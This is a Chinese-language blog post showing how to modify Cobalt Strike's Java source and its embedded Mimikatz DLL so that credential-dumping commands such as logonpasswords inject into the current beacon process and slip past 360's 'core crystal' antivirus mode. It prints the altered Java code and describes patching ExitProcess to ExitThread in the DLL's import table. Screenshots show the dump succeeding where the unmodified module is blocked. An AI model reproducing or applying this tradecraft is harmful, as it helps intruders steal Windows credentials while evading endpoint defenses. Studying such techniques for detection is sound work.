<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> cobaltstrike模块功能修改过360核晶 · Uknow - Stay hungry Stay foolish</title><meta name="description" content="cobaltstrike模块功能修改过360核晶 - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">cobaltstrike模块功能修改过360核晶</h1><div class="post-time">Dec 30, 2021</div><div class="post-content"><p>众所周知，Cobalt Strike的一些功能模块都是用spawn的方法实现，其原理就是启动一个进程，然后对该进程进行功能模块dll反射注入，默认profile下是启动rundll32.exe这个进程，这种行为在数字的核晶模式下是会被拦截的。前两天刚好在吐司看到一篇文章有讲到，修改Cobalt Strike的源码将spawn的方式修改为inject的方法是可以bypass数字核晶的，因为将Cobalt Strike内置的功能模块dll注入到当前进程就没有新启进程的行为。本文结合上述文章并在<strong>@wonderkun</strong>师傅的帮助下得到了一个更好的修改方案。</p>
<h4><span id="功能模块分析">功能模块分析</span></h4><p>Cobalt Strike常见的功能如：<strong>logonpasswords</strong>，<strong>hashdump</strong>等功能在jar代码实现是<strong>beacon.TaskBeacon.class</strong>。</p>
<p>以<strong>logonpasswords</strong>为例，最终定位到如下代码处。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">LogonPasswords</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">   MimikatzSmall(<span class="string">"sekurlsa::logonpasswords"</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">MimikatzSmall</span><span class="params">(String paramString)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.bids.length; i++)</span><br><span class="line">   &#123;</span><br><span class="line">     BeaconEntry localBeaconEntry = DataUtils.getBeacon(<span class="keyword">this</span>.data, <span class="keyword">this</span>.bids[i]);</span><br><span class="line">     <span class="keyword">if</span> (localBeaconEntry.is64()) &#123;</span><br><span class="line">       <span class="keyword">new</span> MimikatzJobSmall(<span class="keyword">this</span>, paramString).spawn(<span class="keyword">this</span>.bids[i], <span class="string">"x64"</span>);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">new</span> MimikatzJobSmall(<span class="keyword">this</span>, paramString).spawn(<span class="keyword">this</span>.bids[i], <span class="string">"x86"</span>);</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>在<strong>MimikatzSmall</strong>方法中，根据目标系统版本进行spawn。跟进到<strong>MimikatzJobSmall</strong>方法，最后rdi的是<strong>mimikatz-min.x64.dll</strong>或者<strong>mimikatz-min.x86.dll</strong>这个dll。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MimikatzJobSmall</span></span></span><br><span class="line"><span class="class">  <span class="keyword">extends</span> <span class="title">MimikatzJob</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">MimikatzJobSmall</span><span class="params">(TaskBeacon paramTaskBeacon, String paramString)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(paramTaskBeacon, paramString);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">getDLLName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.arch.equals(<span class="string">"x64"</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"resources/mimikatz-min.x64.dll"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"resources/mimikatz-min.x86.dll"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4><span id="修改java">修改Java</span></h4><p>只需要将spawn方法修改inject方法即可，jar里实现的inject方法的需要传入pid，因为我们是注入当前进程，所以需要通过jar里实现的方法去获取当前进程的pid。另外需要注意的就是下面代码中的<strong>localBeaconEntry.arch()</strong>获取是当前进程的位数，而原来代码里的<strong>localBeaconEntry.is64()</strong>获取系统的位数。因为我们用到的是inject，所以需要在x64的进程中注入x64的dll，x86的dll中注入x86的dll。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">MimikatzSmall</span><span class="params">(String paramString)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.bids.length; i++)</span><br><span class="line">   &#123;</span><br><span class="line">     BeaconEntry localBeaconEntry = DataUtils.getBeacon(<span class="keyword">this</span>.data, <span class="keyword">this</span>.bids[i]);</span><br><span class="line">  <span class="keyword">int</span> PID = CommonUtils.toNumber(localBeaconEntry.getPid(), <span class="number">0</span>); </span><br><span class="line">     <span class="keyword">if</span> (<span class="string">"x64"</span>.equals(localBeaconEntry.arch())) &#123;</span><br><span class="line">	  <span class="keyword">new</span> MimikatzJobSmall(<span class="keyword">this</span>, paramString).inject(PID, <span class="string">"x64"</span>);</span><br><span class="line">         <span class="comment">//new MimikatzJobSmall(this, paramString).spawn(this.bids[i], "x64");</span></span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	  <span class="keyword">new</span> MimikatzJobSmall(<span class="keyword">this</span>, paramString).inject(PID, <span class="string">"x86"</span>);</span><br><span class="line">	  <span class="comment">//new MimikatzJobSmall(this, paramString).spawn(this.bids[i], "x86");</span></span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h4><span id="dll加解密">DLL加解密</span></h4><p>因为Cobalt Strike中的DLL是加密的，需要进行解密才能对其dll进行修改。相关操作这里就不再详细说了。</p>
<p>具体可以参考：<a href="https://github.com/lovechoudoufu/cobaltstrike4.4_cdf#dll%E4%BF%AE%E6%94%B9" target="_blank" rel="noopener">https://github.com/lovechoudoufu/cobaltstrike4.4_cdf#dll%E4%BF%AE%E6%94%B9</a></p>
<h4><span id="修改相应的dll">修改相应的DLL</span></h4><p>以<strong>logonpasswords</strong>为例，最后rdi的是<strong>mimikatz-min.x64.dll</strong>或者<strong>mimikatz-min.x86.dll</strong>这个dll。ida看一下这个dll，可以看到DLL的核心功能是在<strong>dllmain</strong>中完成的，调用功能函数之后，会直接调用<strong>ExitProcess</strong> 退出了进程。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/csbypass-1.png" alt=""></p>
<p>这对于<strong>spawn</strong>方法是没有问题的，因为是新启动的<strong>rundll32.exe</strong>进程，执行完功能之后执行<strong>ExitProcess</strong>退出，但是被改成<strong>inject</strong>之后就有问题了，因为是在当前beacon进程空间中执行的，所以执行完功能会到导致当前的beacon进程挂掉。所以我们直接patch掉这个对<strong>ExitProcess</strong>的调用就可以了，但是看了一下对<strong>ExitProcess</strong>的调用是有多处的，一个一个patch太麻烦了。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/csbypass-2.png" alt=""></p>
<p>所以这里有个更好的方法，就是直接把 <strong>ExitProcess</strong>修改为<strong>ExitThread</strong>方法 。由于当前的dll是被<strong>inject</strong>方法调用起来的，是在当前进程空间新启动的线程，所以当前进程挂掉之后，beacon进程的主线程不会受到影响。这里利用 <strong>CFF Explorer</strong> 修改导入表就可以了。<img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/csbypass-3.png" alt=""></p>
<p>然后再用ida打开，发现调用的就是<strong>ExitThread</strong>了。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/csbypass-4.png" alt=""></p>
<h4><span id="测试">测试</span></h4><p>将dll和java修改完后，直接替换jar里的即可。简单测试一下是否过数字核晶。</p>
<p>我们直接执行<strong>mimikatz coffee</strong>命令，这里的<strong>mimikatz</strong>和<strong>logonpasswords</strong>调用的是不同的两个dll，其中<strong>logonpasswords</strong>是用inject方法，而<strong>mimikatz coffee</strong>未做修改，用的spawn方法。可以看到未修改的被拦截了，而修改过的成功执行回显。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/csbypass-5.png" alt="image-20220507213415129"></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/csbypass-6.png" alt="image-20220507213535465"></p>
<h6><span id="bug">BUG</span></h6><p>如果我们上线的进程为x86的进程，而目标系统位数为x64位，此时我们执行<strong>logonpasswords</strong>，会对其x86进程注入x86的dll。此时会报错，报错内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR kuhl_m_sekurlsa_acquireLSA ; mimikatz x86 cannot access x64 process</span><br></pre></td></tr></table></figure>
<p>这主要是内置的mimikatz的dll存在问题，msf中的mimikatz也会存在这个问题。因为目标系统为x64，所以需要一个x64的进程来注入x64的dll，即可。</p>
<h4><span id="参考文章">参考文章</span></h4><p><a href="https://www.t00ls.cc/viewthread.php?tid=65597" target="_blank" rel="noopener">https://www.t00ls.cc/viewthread.php?tid=65597</a></p>
</div></article></div></section><footer><div class="paginator"><a href="/posts/notes/非约束委派 + Kerberos中继.html" class="next">下一篇</a></div><div class="copyright"><p>© 2016 - 2024 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>